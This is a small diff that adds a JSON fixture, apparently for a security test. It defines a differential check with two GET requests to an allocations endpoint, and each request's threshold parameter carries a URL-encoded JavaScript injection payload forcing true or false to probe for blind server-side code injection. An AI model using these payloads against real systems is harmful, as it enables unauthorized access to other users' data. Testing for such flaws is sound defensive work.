@@ -1,0 +1,5 @@
+{ "login_as": "user",
+  "differential": {
+    "true_request":  { "method": "GET", "path": "/allocations/2?threshold=999'%3breturn%20true%3bvar%20x%3d'" },
+    "false_request": { "method": "GET", "path": "/allocations/2?threshold=999'%3breturn%20false%3bvar%20x%3d'" }
+  } }
